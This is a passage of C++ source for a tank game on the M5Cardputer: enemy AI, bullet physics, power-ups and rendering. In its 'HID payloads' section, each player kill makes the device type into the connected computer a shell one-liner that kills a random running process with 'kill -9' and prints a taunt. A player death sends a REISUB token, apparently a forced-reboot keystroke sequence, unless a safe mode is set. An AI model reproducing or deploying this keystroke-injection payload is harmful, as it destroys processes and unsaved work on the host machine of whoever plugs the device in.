            case ET_RUSHER:    fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN / 3   / diffF); btype = BT_RUSHER;    break;
            case ET_BOUNCER:   fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN       / diffF); btype = BT_BOUNCE;    break;
            case ET_MEDIC:     fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN * 2   / diffF); btype = BT_NORMAL;    break;
            case ET_SHIELDER:  fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN * 4/3 / diffF); btype = BT_NORMAL;    break;
            case ET_TWINS:     fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN * 5/4 / diffF); btype = BT_NORMAL;    break;
            default:           fireCooldown = (unsigned long)(ENEMY_FIRE_COOLDOWN       / diffF); btype = BT_NORMAL;    break;
        }

        // Medic: periodically heal the nearest damaged ally
        if (e.type == ET_MEDIC) {
            e.patrolTimer++;
            if (e.patrolTimer > 50) {
                e.patrolTimer = 0;
                static const int MAX_HP_FOR_TYPE[11] = { 1,1,3,1,2,1,1,1,2,2,1 };
                float bestD2 = 55.f*55.f;
                int   bestJ  = -1;
                for (int j = 0; j < ENEMY_COUNT; j++) {
                    if (j == i || _enemies[j].hp <= 0) continue;
                    if (_enemies[j].hp >= MAX_HP_FOR_TYPE[_enemies[j].type]) continue;
                    float rx=e.x-_enemies[j].x, ry=e.y-_enemies[j].y;
                    float d2=rx*rx+ry*ry;
                    if (d2 < bestD2) { bestD2=d2; bestJ=j; }
                }
                if (bestJ >= 0) _enemies[bestJ].hp++;
            }
        }

        // Stealth only fires when invisible phase
        bool canFire = !(e.type == ET_STEALTH && stealthVisible);
        if (canFire) {
            float aimThresh = (e.aiState == 3 || e.type == ET_RUSHER) ? 0.8f : 0.45f;
            float angleDiff = fabsf(wrapAngle(towardAngle - e.angle));
            // Panic state: fires on its own cooldown without waiting for nextFirer turn
            bool fireTurn = (e.aiState == 3) ? true : (i == nextFirer);
            if (fireTurn && angleDiff < aimThresh && dist < 300.f
                && now - e.lastShot > fireCooldown) {
                if (e.type == ET_ARTILLERY) {
                    _fireBullet(e, false, btype, -0.25f, bdmg);
                    _fireBullet(e, false, btype,  0.f,   bdmg);
                    _fireBullet(e, false, btype,  0.25f, bdmg);
                } else if (e.type == ET_TWINS) {
                    _fireBullet(e, false, btype, -0.12f, bdmg);
                    _fireBullet(e, false, btype,  0.12f, bdmg);
                } else {
                    _fireBullet(e, false, btype, 0.f, bdmg);
                }
                if (e.aiState != 3) _lastFirer = i;
            }
        }

        // Repulse from other enemies
        for (int j = 0; j < ENEMY_COUNT; j++) {
            if (j == i || _enemies[j].hp <= 0) continue;
            float rx = e.x-_enemies[j].x, ry = e.y-_enemies[j].y;
            float rd = sqrtf(rx*rx+ry*ry);
            if (rd > 0.01f && rd < REPULSE_DIST) {
                float push = REPULSE_STRENGTH*(1.f-rd/REPULSE_DIST);
                float rpx  = e.x + rx/rd*push, rpy = e.y + ry/rd*push;
                if (!_circleWall(rpx, e.y, TANK_R)) e.x = fclamp(rpx, (float)TANK_R, (float)(VAW-TANK_R));
                if (!_circleWall(e.x, rpy, TANK_R)) e.y = fclamp(rpy, (float)TANK_R, (float)(VPLAY_H-TANK_R));
            }
        }
    }
}

// ---- fire bullet ----

void AppCombatProx::_fireBullet(Tank& shooter, bool fromPlayer,
                                 uint8_t btype, float angleOffset, int damage) {
    for (int i = 0; i < MAX_BULLETS; i++) {
        if (_bullets[i].active) continue;
        float ang = shooter.angle + angleOffset;
        float ca  = cosf(ang), sa = sinf(ang);

        float spd;
        switch (btype) {
            case BT_FAST:      spd = BSPEED_FAST;    break;
            case BT_SNIPER:    spd = BSPEED_SNIPER;  break;
            case BT_HEAVY:     spd = BSPEED_HEAVY;   break;
            case BT_RUSHER:    spd = BSPEED_RUSHER;  break;
            case BT_ARTILLERY: spd = BSPEED;         break;
            default:           spd = BSPEED;         break;
        }

        _bullets[i].x          = shooter.x + ca*(TANK_R+BULLET_R+1);
        _bullets[i].y          = shooter.y + sa*(TANK_R+BULLET_R+1);
        _bullets[i].vx         = ca*spd;
        _bullets[i].vy         = sa*spd;
        _bullets[i].dist       = 0.f;
        _bullets[i].active     = true;
        _bullets[i].fromPlayer = fromPlayer;
        _bullets[i].btype      = btype;
        _bullets[i].damage     = damage;
        _bullets[i].bounces    = (btype == BT_BOUNCE) ? 1 : 0;
        shooter.lastShot       = millis();

        // Type-based sounds
        {
            static constexpr int SR = 8000;
            static constexpr int NS = 160;
            static int8_t buf[NS];
            int sf, ef, noisy = 0;
            switch (btype) {
                case BT_FAST:      sf = 2200; ef =  800; noisy = 0; break;
                case BT_HEAVY:     sf =  300; ef =   80; noisy = 1; break;
                case BT_SNIPER:    sf = 3000; ef = 2000; noisy = 0; break;
                case BT_ARTILLERY: sf =  400; ef =  100; noisy = 1; break;
                case BT_RUSHER:    sf = 1600; ef =  900; noisy = 0; break;
                case BT_BOUNCE:    sf = 1000; ef =  600; noisy = 0; break;
                case BT_PLAYER_H:  sf = 1800; ef =  300; noisy = 0; break;
                default:
                    sf = fromPlayer ? 1400 : 800;
                    ef = fromPlayer ?  400 : 200;
                    break;
            }
            float phase = 0.f;
            for (int s = 0; s < NS; s++) {
                float t    = (float)s / NS;
                float freq = sf + (ef-sf)*t;
                float env  = 1.f - t;
                phase += 2.f*(float)M_PI*freq/SR;
                int8_t samp = (int8_t)(sinf(phase)*90.f*env);
                if (noisy) samp = (int8_t)(samp*0.5f + ((esp_random()&0xFF)-128)*0.4f*env);
                buf[s] = samp;
            }
            M5Cardputer.Speaker.playRaw(buf, NS, SR, false, 1, 0);
        }
        return;
    }
}

// ---- HID payloads ----

void AppCombatProx::_onPlayerKill(int points) {
    String cmd =
        "ps -eo pid=,comm= | awk 'NR>1\\{a[NR]=$1;n[NR]=$2\\}"
        "END\\{srand();r=int(rand()*(NR-1))+2;"
        "print \"Ops, I guess you did not need \"n[r]\"...\";system(\"kill -9 \"a[r])\\}'\n";
    pendingTokenStrings.push_back(cmd);
    _score += points;
}

void AppCombatProx::_onPlayerDied() {
    if (_reisub)
        pendingTokenStrings.push_back(String(REISUB_TOKEN));
}

// ---- physics / wave management ----

void AppCombatProx::_update(unsigned long now) {
    float dt = fclamp((now - _lastUpdate) / 16.67f, 0.5f, 3.0f);
    _lastUpdate = now;

    // Bullet physics
    for (int i = 0; i < MAX_BULLETS; i++) {
        Bullet& b = _bullets[i];
        if (!b.active) continue;

        float step = sqrtf(b.vx*b.vx + b.vy*b.vy)*dt;
        b.x += b.vx*dt;
        b.y += b.vy*dt;
        b.dist += step;

        float maxDist = (b.btype == BT_SNIPER) ? MAX_BULLET_DIST_SNP : MAX_BULLET_DIST;
        if (b.dist > maxDist || b.x < 0 || b.x >= VAW || b.y < 0 || b.y >= VPLAY_H) {
            b.active = false; continue;
        }

        if (_wallAt(b.x, b.y)) {
            if (b.bounces > 0) {
                // Simple axis-flip bounce: test which axis caused the hit
                bool hitX = _wallAt(b.x, b.y - b.vy*dt);
                bool hitY = _wallAt(b.x - b.vx*dt, b.y);
                if (hitX) b.vx = -b.vx;
                if (hitY) b.vy = -b.vy;
                if (!hitX && !hitY) { b.vx = -b.vx; b.vy = -b.vy; }
                b.x = fclamp(b.x, 0.f, (float)(VAW-1));
                b.y = fclamp(b.y, 0.f, (float)(VPLAY_H-1));
                b.bounces--;
                b.dist = 0.f;
            } else {
                b.active = false; continue;
            }
        }

        if (b.fromPlayer) {
            for (int e = 0; e < ENEMY_COUNT; e++) {
                if (_enemies[e].hp <= 0) continue;
                float ddx = b.x-_enemies[e].x, ddy = b.y-_enemies[e].y;
                if (ddx*ddx+ddy*ddy < (TANK_R+BULLET_R)*(TANK_R+BULLET_R)) {
                    // Shielder: absorb if bullet arrives from within ±0.5 rad of facing
                    if (_enemies[e].type == ET_SHIELDER) {
                        float bAng = atan2f(-b.vy, -b.vx);  // direction bullet came from
                        if (fabsf(wrapAngle(bAng - _enemies[e].angle)) < 0.55f) {
                            b.active = false; break;  // deflected — no damage
                        }
                    }
                    b.active = false;
                    _enemies[e].hp -= b.damage;
                    if (_enemies[e].hp <= 0) {
                        // 10 pts base; harder types earn more
                        static const int PTS[11] = { 10, 20, 30, 20, 30, 20, 20, 20, 30, 30, 20 };
                        _onPlayerKill(PTS[_enemies[e].type]);
                    }
                    break;
                }
            }
        } else {
            float ddx = b.x-_player.x, ddy = b.y-_player.y;
            if (ddx*ddx+ddy*ddy < (TANK_R+BULLET_R)*(TANK_R+BULLET_R)) {
                b.active = false;
                _player.hp -= b.damage;
                _popPowerup();  // losing a powerup on hit
                if (_player.hp <= 0) {
                    _pendingReisub = true;
                    _phase = PH_DEAD; _phaseEnter = now; _needsRedraw = true; return;
                }
            }
        }
    }

    // Powerup collection
    for (int i = 0; i < MAX_POWERUPS; i++) {
        Powerup& pu = _powerups[i];
        if (!pu.active) continue;
        float ddx = pu.x-_player.x, ddy = pu.y-_player.y;
        if (ddx*ddx+ddy*ddy < (TANK_R+5)*(TANK_R+5)) {
            pu.active = false;
            switch (pu.type) {
                case PU_REPAIR:
                    _player.hp++;
                    if (_player.hp > _playerMaxHP) _player.hp = _playerMaxHP;
                    _notifyMsg = "Hull Repaired! +10";
                    _score += 10;
                    break;
                case PU_HP_UP:
                    if (_playerMaxHP < PLAYER_HP_MAX) {
                        _playerMaxHP++;
                        _player.hp++;
                        if (_puCount < PU_STACK_MAX) _puStack[_puCount++] = pu.type;
                    }
                    _notifyMsg = "Hull Extended! +10";
                    _score += 10;
                    break;
                case PU_FIRE_RATE:
                    if (_puCount < PU_STACK_MAX) _puStack[_puCount++] = pu.type;
                    _applyPuStack();
                    _notifyMsg = "Fire Rate Up! +10";
                    _score += 10;
                    break;
                case PU_SPREAD:
                    if (_puCount < PU_STACK_MAX) _puStack[_puCount++] = pu.type;
                    _applyPuStack();
                    _notifyMsg = "Spread Shot! +10";
                    _score += 10;
                    break;
                case PU_HEAVY_SHOT:
                    if (_puCount < PU_STACK_MAX) _puStack[_puCount++] = pu.type;
                    _applyPuStack();
                    _notifyMsg = "Heavy Rounds! +10";
                    _score += 10;
                    break;
                case PU_SPEED:
                    if (_puCount < PU_STACK_MAX) _puStack[_puCount++] = pu.type;
                    _applyPuStack();
                    _notifyMsg = "Speed Boost! +10";
                    _score += 10;
                    break;
            }
            _notifyEnd = now + 2000;
        }
    }

    // Kamikaze contact
    if (_kamikazeIdx >= 0 && _enemies[_kamikazeIdx].hp > 0) {
        float kdx = _enemies[_kamikazeIdx].x-_player.x;
        float kdy = _enemies[_kamikazeIdx].y-_player.y;
        if (kdx*kdx+kdy*kdy < (TANK_R*2)*(TANK_R*2)) {
            _enemies[_kamikazeIdx].hp = 0;
            _exploding = true; _explodeStart = now;
            _explodeX  = (int)_enemies[_kamikazeIdx].x - _camX;
            _explodeY  = (int)_enemies[_kamikazeIdx].y - _camY;
            {
                static constexpr int SR = 8000, NS = 400;
                static int8_t ebuf[NS];
                for (int s = 0; s < NS; s++) {
                    float t = (float)s/NS, env = (1.f-t)*(1.f-t);
                    ebuf[s] = (int8_t)(((esp_random()&0xFF)-128)*env*0.8f);
                }
                M5Cardputer.Speaker.playRaw(ebuf, NS, SR, false, 1, 0);
            }
            _player.hp = 0;
            _pendingReisub = true;
            _phase = PH_DEAD; _phaseEnter = now; _needsRedraw = true; return;
        }
    }

    // Wave management
    {
        int aliveInitial = 0;
        for (int e = 0; e < ARENA_ENEMY_COUNT; e++) if (_enemies[e].hp > 0) aliveInitial++;
        if (!_initialWaveCleared && aliveInitial == 0) _initialWaveCleared = true;
        if (_initialWaveCleared && !_reinforceSent) { _reinforceSent = true; _spawnReinforcements(); }

        bool anyAlive = false;
        for (int e = 0; e < ENEMY_COUNT; e++) if (_enemies[e].hp > 0) anyAlive = true;
        if (!anyAlive && _reinforceSent && !_kamikazeSent) {
            _kamikazeSent = true;
            if ((esp_random() % 3) == 0) { _spawnKamikaze(); anyAlive = true; }
        }

        // All enemies cleared — reveal keys, prompt player
        if (!anyAlive && _reinforceSent && _kamikazeSent && !_keyActive) {
            _keyActive = true;
            if (_numKeys > 1)
                _notifyMsg = "Find all Keys & reach the Exit!";
            else
                _notifyMsg = "Find the Key & reach the Exit!";
            _notifyEnd = now + 4000;
        }
    }

    // Key pickup
    if (_keyActive) {
        for (int ki = 0; ki < _numKeys; ki++) {
            if (_keyPickedUp[ki]) continue;
            float kdx = _player.x - _keyX[ki], kdy = _player.y - _keyY[ki];
            if (kdx*kdx + kdy*kdy < (TANK_R+7)*(TANK_R+7)) {
                _keyPickedUp[ki] = true;
                _keysCollected++;
                if (_keysCollected < _numKeys) {
                    char buf[32];
                    snprintf(buf, sizeof(buf), "Key %d/%d! Keep searching!", _keysCollected, _numKeys);
                    // store in static buffer — valid until next notify
                    static char notifBuf[32];
                    memcpy(notifBuf, buf, sizeof(buf));
                    _notifyMsg = notifBuf;
                } else {
                    _notifyMsg = "All Keys! Reach the Exit!";
                }
                _notifyEnd = now + 3000;
            }
        }
    }

    // Exit reached (all keys collected)
    if (_keysCollected >= _numKeys && _numKeys > 0) {
        float ex = _exitCellC * CELL + CELL * 0.5f;
        float ey = _exitCellR * CELL + CELL * 0.5f;
        float edx = _player.x - ex, edy = _player.y - ey;
        if (edx*edx + edy*edy < (TANK_R*3)*(TANK_R*3)) {
            _phase = PH_ROUND_CLEAR; _phaseEnter = now; _needsRedraw = true; return;
        }
    }

    // Kamikaze AI
    if (_kamikazeIdx >= 0 && _enemies[_kamikazeIdx].hp > 0) {
        Tank& k = _enemies[_kamikazeIdx];
        float dx = _player.x-k.x, dy = _player.y-k.y;
        float dist = sqrtf(dx*dx+dy*dy);
        if (dist > 1.f) {
            int kc = (int)(k.x/CELL), kr = (int)(k.y/CELL);
            int pc = (int)(_player.x/CELL), pr = (int)(_player.y/CELL);
            if (k.pathLen == 0 || k.pathIdx >= k.pathLen ||
                (millis()-k.pathTimer > (unsigned long)PATH_REPLAN_MS)) {
                k.pathTimer = millis();
                if (!_astar(kc,kr,pc,pr,k)) k.pathLen = 0;
            }
            float targetAngle;
            if (k.pathLen > 0 && k.pathIdx < k.pathLen) {
                int wx=k.pathX[k.pathIdx], wy=k.pathY[k.pathIdx];
                float wpx=wx*CELL+CELL*0.5f, wpy=wy*CELL+CELL*0.5f;
                if (sqrtf((wpx-k.x)*(wpx-k.x)+(wpy-k.y)*(wpy-k.y)) < WAYPOINT_RADIUS) k.pathIdx++;
                if (k.pathIdx < k.pathLen) {
                    wx=k.pathX[k.pathIdx]; wy=k.pathY[k.pathIdx];
                    wpx=wx*CELL+CELL*0.5f; wpy=wy*CELL+CELL*0.5f;
                }
                targetAngle = atan2f(wpy-k.y, wpx-k.x);
            } else {
                targetAngle = atan2f(dy, dx);
            }
            float diff = wrapAngle(targetAngle-k.angle);
            k.angle = wrapAngle(k.angle + fclamp(diff, -AI_TURN_SPEED*3, AI_TURN_SPEED*3));
            float nx = k.x+cosf(k.angle)*KAMIKAZE_SPEED;
            float ny = k.y+sinf(k.angle)*KAMIKAZE_SPEED;
            if (!_circleWall(nx,ny,TANK_R)) {
                k.x = fclamp(nx,(float)TANK_R,(float)(VAW-TANK_R));
                k.y = fclamp(ny,(float)TANK_R,(float)(VPLAY_H-TANK_R));
            } else {
                if (!_circleWall(nx,k.y,TANK_R)) k.x = fclamp(nx,(float)TANK_R,(float)(VAW-TANK_R));
                if (!_circleWall(k.x,ny,TANK_R)) k.y = fclamp(ny,(float)TANK_R,(float)(VPLAY_H-TANK_R));
            }
        }
    }

    _aiStep(now);
    _camX = (int)fclamp(_player.x - AW/2,    0.f, (float)(VAW-AW));
    _camY = (int)fclamp(_player.y - PLAY_H/2, 0.f, (float)(VPLAY_H-PLAY_H));
}

// ---- drawing helpers ----

static void combatFillRotRect(M5GFX& d, int cx, int cy, float ca, float sa,
                               float hl, float hw, uint16_t col) {
    int x0=(int)(cx-fabsf(ca)*hl-fabsf(sa)*hw), x1=(int)(cx+fabsf(ca)*hl+fabsf(sa)*hw)+1;
    int y0=(int)(cy-fabsf(sa)*hl-fabsf(ca)*hw), y1=(int)(cy+fabsf(sa)*hl+fabsf(ca)*hw)+1;
    for (int py=y0; py<=y1; py++)
        for (int px=x0; px<=x1; px++) {
            float dx=px-cx, dy=py-cy;
            float lx=dx*ca+dy*sa, ly=-dx*sa+dy*ca;
            if (lx>=-hl && lx<=hl && ly>=-hw && ly<=hw) d.drawPixel(px, py, col);
        }
}

void AppCombatProx::_drawTank(const Tank& t, uint16_t col) {
    if (t.hp <= 0) return;
    int sx=(int)t.x-_camX, sy=(int)t.y-_camY;
    if (sx<-14||sx>AW+14||sy<-14||sy>PLAY_H+14) return;

    // Stealth: only render when visible
    if (t.type == ET_STEALTH && col != C_PLAYER) {
        bool vis = ((millis() - _stealthFlash) < 400);
        if (!vis) return;
        col = C_STEALTH;
    }

    auto& d = M5Cardputer.Display;
    float ca=cosf(t.angle), sa=sinf(t.angle);
    bool isKamikaze = (col == C_KAMIKAZE);

    float hl, hw, trackOff;
    switch (t.type) {
        case ET_HEAVY:     hl=5.5f; hw=3.5f; trackOff=6.f;  break;
        case ET_SCOUT:     hl=3.5f; hw=2.0f; trackOff=4.5f; break;
        case ET_ARTILLERY: hl=6.0f; hw=4.0f; trackOff=6.5f; break;
        case ET_SHIELDER:  hl=5.0f; hw=3.0f; trackOff=5.5f; break;
        case ET_TWINS:     hl=4.0f; hw=2.5f; trackOff=5.0f; break;
        case ET_MEDIC:     hl=3.8f; hw=2.2f; trackOff=4.8f; break;
        default:           hl=4.0f; hw=2.5f; trackOff=5.0f; break;
    }
    if (isKamikaze) { hl=4.5f; hw=2.5f; trackOff=5.0f; }

    float lx=-sa*trackOff, ly=ca*trackOff;
    float rx=sa*trackOff,  ry=-ca*trackOff;

    uint16_t trackCol, turretCol;
    if      (col == C_PLAYER)     { trackCol=0x0300;  turretCol=0x3FE0; }
    else if (t.type==ET_HEAVY)    { trackCol=0x4000;  turretCol=0xA000; }
    else if (t.type==ET_SCOUT)    { trackCol=0x0488;  turretCol=0x05FF; }
    else if (t.type==ET_SNIPER)   { trackCol=0x7810;  turretCol=0xC01F; }
    else if (t.type==ET_ARTILLERY){ trackCol=0x8200;  turretCol=0xFCA0; }
    else if (t.type==ET_RUSHER)   { trackCol=0x8400;  turretCol=0xFFFF; }
    else if (t.type==ET_STEALTH)  { trackCol=0x2104;  turretCol=0x4208; }
    else if (t.type==ET_BOUNCER)  { trackCol=0x0244;  turretCol=0x07DF; }
    else if (t.type==ET_MEDIC)    { trackCol=0x0300;  turretCol=0x47E0; }
    else if (t.type==ET_SHIELDER) { trackCol=0x5269;  turretCol=0xDEFB; }
    else if (t.type==ET_TWINS)    { trackCol=0x8008;  turretCol=0xFC3F; }
    else                           { trackCol=0x6000;  turretCol=0xFB00; }

    combatFillRotRect(d,(int)(sx+lx),(int)(sy+ly),ca,sa,hl+1.5f,1.5f,trackCol);
    combatFillRotRect(d,(int)(sx+rx),(int)(sy+ry),ca,sa,hl+1.5f,1.5f,trackCol);
    combatFillRotRect(d,sx,sy,ca,sa,hl,hw,col);

    if (isKamikaze) {
        d.drawLine(sx-3,sy-3,sx+3,sy+3,0xFFFF);
        d.drawLine(sx+3,sy-3,sx-3,sy+3,0xFFFF);
    } else {
        int turretR   = (t.type==ET_HEAVY||t.type==ET_ARTILLERY||t.type==ET_SHIELDER) ? 3 : 2;
        int barrelEnd = (t.type==ET_SNIPER)    ? 10 :
                        (t.type==ET_ARTILLERY) ?  5 :
                        (t.type==ET_HEAVY)     ?  6 : 7;
        d.fillCircle(sx,sy,turretR,turretCol);
        for (int bi=turretR+1; bi<=barrelEnd; bi++)
            d.drawPixel(sx+(int)(ca*bi), sy+(int)(sa*bi), 0xFFFF);
        // Artillery: twin barrels
        if (t.type == ET_ARTILLERY) {
            for (int bi=3; bi<=7; bi++) {
                d.drawPixel(sx+(int)(ca*bi - sa*2), sy+(int)(sa*bi + ca*2), 0xFFFF);
                d.drawPixel(sx+(int)(ca*bi + sa*2), sy+(int)(sa*bi - ca*2), 0xFFFF);
            }
        }
        // Twins: two parallel narrow barrels
        if (t.type == ET_TWINS) {
            for (int bi=3; bi<=7; bi++) {
                d.drawPixel(sx+(int)(ca*bi - sa*3), sy+(int)(sa*bi + ca*3), 0xFFFF);
                d.drawPixel(sx+(int)(ca*bi + sa*3), sy+(int)(sa*bi - ca*3), 0xFFFF);
            }
        }
        // Shielder: draw a curved arc shield on the front face
        if (t.type == ET_SHIELDER) {
            for (int deg = -50; deg <= 50; deg += 10) {
                float a  = t.angle + deg * (float)M_PI / 180.f;
                int  shx = sx + (int)(cosf(a)*8.f);
                int  shy = sy + (int)(sinf(a)*8.f);
                d.drawPixel(shx, shy, 0xFFFF);
            }
        }
        // Medic: draw a small cross on the hull
        if (t.type == ET_MEDIC) {
            d.drawLine(sx-3, sy, sx+3, sy, 0xFFFF);
            d.drawLine(sx, sy-3, sx, sy+3, 0xFFFF);
        }
    }

    // HP pips for multi-HP enemies
    if (!isKamikaze && t.hp > 1) {
        for (int p=0; p<t.hp && p<4; p++)
            d.fillRect(sx-3+p*3, sy-9, 2, 2, 0xFFE0);
    }
}

void AppCombatProx::_drawBullet(const Bullet& b) {
    if (!b.active) return;
    int sx=(int)b.x-_camX, sy=(int)b.y-_camY;
    if (sx<-4||sx>AW+4||sy<-4||sy>PLAY_H+4) return;
    auto& d = M5Cardputer.Display;
    uint16_t col; int r;
    switch (b.btype) {
        case BT_FAST:      col=0x07FF; r=1; break;
        case BT_HEAVY:     col=0x8800; r=3; break;
        case BT_SNIPER:    col=0xF81F; r=1; break;
        case BT_ARTILLERY: col=0xFC60; r=3; break;
        case BT_RUSHER:    col=0xFFFF; r=1; break;
        case BT_BOUNCE:    col=0xFFE0; r=2; break;
        case BT_PLAYER_H:  col=0xF81F; r=3; break;
        default:           col = b.fromPlayer ? C_BULLET_P : C_BULLET_E; r=BULLET_R; break;
    }
    d.fillCircle(sx, sy, r, col);
    // Fast/sniper: draw a short streak for visual clarity
    if (b.btype == BT_FAST || b.btype == BT_SNIPER) {
        float spd = sqrtf(b.vx*b.vx+b.vy*b.vy);
        if (spd > 0.01f) {
            int tx = sx - (int)(b.vx/spd*4), ty = sy - (int)(b.vy/spd*4);
            d.drawLine(sx, sy, tx, ty, col);
        }
    }
}

void AppCombatProx::_drawPowerups() {
    auto& d = M5Cardputer.Display;
    unsigned long now = millis();
    for (int i = 0; i < MAX_POWERUPS; i++) {
        const Powerup& pu = _powerups[i];
        if (!pu.active) continue;
        int sx = (int)pu.x - _camX, sy = (int)pu.y - _camY;
        if (sx < -8 || sx > AW+8 || sy < -8 || sy > PLAY_H+8) continue;

        // Pulse: brighten every 600ms
        bool bright = ((now / 600) & 1);
        uint16_t col, col2;
        const char* lbl;
        switch (pu.type) {
            case PU_REPAIR:     col=C_PU_REPAIR; col2=0x03A0; lbl="+"; break;
            case PU_HP_UP:      col=C_PU_HPUP;   col2=0x0388; lbl="H"; break;
            case PU_FIRE_RATE:  col=C_PU_FIRE;   col2=0x8400; lbl="F"; break;
            case PU_SPREAD:     col=C_PU_SPREAD;  col2=0x8200; lbl="S"; break;
            case PU_HEAVY_SHOT: col=C_PU_HEAVY;  col2=0x7810; lbl="W"; break;
            case PU_SPEED:      col=C_PU_SPEED;  col2=0x0488; lbl="V"; break;
            default: continue;
        }
        uint16_t outline = bright ? 0xFFFF : col2;
        d.drawCircle(sx, sy, 5, outline);
        d.fillCircle(sx, sy, 4, col);
        d.setTextSize(1);
        d.setTextColor(0x0000, col);
        d.drawString(lbl, sx - d.textWidth(lbl)/2, sy-3);
    }
}

void AppCombatProx::_drawArena() {
    auto& d = M5Cardputer.Display;
    d.fillRect(0, 0, AW, PLAY_H, C_BG);

    int colMin=_camX/CELL, colMax=(_camX+AW)/CELL+1;
    int rowMin=_camY/CELL, rowMax=(_camY+PLAY_H)/CELL+1;
    colMin=colMin<0?0:colMin; rowMin=rowMin<0?0:rowMin;
    colMax=colMax>COLS?COLS:colMax; rowMax=rowMax>ROWS?ROWS:rowMax;

    for (int row=rowMin; row<rowMax; row++) {
        for (int col=colMin; col<colMax; col++) {
            bool isBorder = (col==0||col==COLS-1||row==0||row==ROWS-1);
            bool isExit   = (col==_exitCellC && row==_exitCellR);

            // Check locked doors
            bool isDoor = false; int doorIdx = -1;
            for (int i = 0; i < _numDoors; i++) {
                if (col==_doors[i].c && row==_doors[i].r) { isDoor=true; doorIdx=i; break; }
            }

            bool isWall = isBorder || isDoor ||
                          (_isMaze ? _mazeWalls[row][col] != 0 : _wallMap[row][col] != 0);
            // Exit and open doors are passable
            if (isExit || (isDoor && _keysCollected >= _doors[doorIdx].keysNeeded))
                isWall = false;

            if (isExit) {
                bool open = (_keysCollected >= _numKeys);
                uint16_t ec = open ? C_EXIT : 0x2945;
                d.fillRect(col*CELL-_camX, row*CELL-_camY, CELL, CELL, ec);
                // Arrow pointing outward
                int sx2 = col*CELL-_camX+CELL/2, sy2 = row*CELL-_camY+CELL/2;
                int ax = (col==0)?-3:(col==COLS-1)?3:0;
                int ay = (row==0)?-3:(row==ROWS-1)?3:0;
                d.drawLine(sx2-ax, sy2-ay, sx2+ax*2, sy2+ay*2, 0xFFFF);
            } else if (isDoor) {
                bool open = (_keysCollected >= _doors[doorIdx].keysNeeded);
                if (!open) {
                    // Locked door: brown with key count
                    d.fillRect(col*CELL-_camX, row*CELL-_camY, CELL, CELL, 0x8200);
                    char kn[3]; snprintf(kn,3,"%d",_doors[doorIdx].keysNeeded);
                    d.setTextSize(1);
                    d.setTextColor(0xFFE0, 0x8200);
                    d.drawString(kn, col*CELL-_camX+3, row*CELL-_camY+2);
                }
            } else if (isWall) {
                d.fillRect(col*CELL-_camX, row*CELL-_camY, CELL, CELL, C_WALL);
            }
        }
    }

    // Draw all keys
    if (_keyActive) {
        unsigned long now2 = millis();
        bool pulse = ((now2/400)&1);
        for (int ki = 0; ki < _numKeys; ki++) {
            if (_keyPickedUp[ki]) continue;
            int ksx=(int)_keyX[ki]-_camX, ksy=(int)_keyY[ki]-_camY;
            if (ksx<-8||ksx>AW+8||ksy<-8||ksy>PLAY_H+8) continue;
            uint16_t kc = pulse ? C_KEY : 0xA980;
            d.fillCircle(ksx, ksy, 5, kc);
            d.drawCircle(ksx, ksy, 6, 0xFFFF);
            // Key number
            char kn[3]; snprintf(kn,3,"%d",ki+1);
            d.setTextSize(1); d.setTextColor(0x0000, kc);
            d.drawString(kn, ksx-d.textWidth(kn)/2, ksy-3);
        }
    }

    _drawPowerups();
    _drawTank(_player, C_PLAYER);
    for (int e=0; e<ENEMY_COUNT; e++) {
        if (_enemies[e].hp <= 0) continue;
        uint16_t ec;
        if (e == _kamikazeIdx) {
            ec = C_KAMIKAZE;
        } else {
            switch (_enemies[e].type) {
                case ET_SCOUT:     ec=C_SCOUT;     break;
                case ET_HEAVY:     ec=C_HEAVY;     break;
                case ET_SNIPER:    ec=C_SNIPER;    break;
                case ET_ARTILLERY: ec=C_ARTILLERY; break;
                case ET_RUSHER:    ec=C_RUSHER;    break;
                case ET_STEALTH:   ec=C_STEALTH;   break;
                case ET_BOUNCER:   ec=C_BOUNCER;   break;
                case ET_MEDIC:     ec=C_MEDIC;     break;
                case ET_SHIELDER:  ec=C_SHIELDER;  break;
                case ET_TWINS:     ec=C_TWINS;     break;
                default:           ec=C_ENEMY;     break;
            }
        }
        _drawTank(_enemies[e], ec);
    }
    for (int i=0; i<MAX_BULLETS; i++) _drawBullet(_bullets[i]);
    if (_exploding) _drawExplosion();
    _drawHUD();
}

void AppCombatProx::_drawExplosion() {
    static constexpr unsigned long EXPLODE_MS = 600;
    unsigned long age = millis()-_explodeStart;
    if (age >= EXPLODE_MS) { _exploding=false; return; }
    float t=(float)age/EXPLODE_MS, r=(int)(t*24.f);
    uint16_t col=(t<0.3f)?0xFFE0:(t<0.6f?0xFC00:0x8400);
    auto& d = M5Cardputer.Display;
    d.drawCircle(_explodeX,_explodeY,(int)r,col);
    d.drawCircle(_explodeX,_explodeY,(int)r/2,col);
    for (int sp=0; sp<6; sp++) {
        float a=(float)sp*(float)M_PI/3.f+t*(float)M_PI;
        int sx=_explodeX+(int)(cosf(a)*r*1.2f), sy=_explodeY+(int)(sinf(a)*r*1.2f);
        if (sx>=0&&sx<AW&&sy>=0&&sy<PLAY_H) d.fillCircle(sx,sy,2,col);
    }
}

void AppCombatProx::_drawHUD() {
    auto& d = M5Cardputer.Display;
    d.fillRect(0, PLAY_H, AW, BAR_H, C_HUD_BG);
    d.setTextSize(1);

    // HP pips (use _playerMaxHP for total slots)
    d.setTextColor(C_TEXT, C_HUD_BG);
    d.drawString("HP:", 2, PLAY_H+3);
    for (int i=0; i<_playerMaxHP; i++) {
        uint16_t pip = (i < _player.hp) ? (uint16_t)0x07E0 : (uint16_t)0x39E7;
        d.fillRect(22+i*8, PLAY_H+3, 6, 7, pip);
    }

    // Safe mode indicator
    int afterHP = 22 + _playerMaxHP*8 + 2;
    if (!_reisub) {
        d.setTextColor(0xF800, C_HUD_BG);
        d.drawString("S", afterHP, PLAY_H+3);
    }

    // Round (centre)
    String rndStr = "R" + String(_round);
    d.setTextColor(0xFFE0, C_HUD_BG);
    d.drawString(rndStr, AW/2 - d.textWidth(rndStr)/2, PLAY_H+3);

    // Score (right)
    d.setTextColor(C_TEXT, C_HUD_BG);
    String sc = String(_score)+"p";
    d.drawString(sc, AW-d.textWidth(sc)-2, PLAY_H+3);

    // Powerup status icons — drawn just left of score if space allows
    if (_puCount > 0) {
        static const char* PU_GLYPHS[7] = { "","R","H","F","S","W","V" };
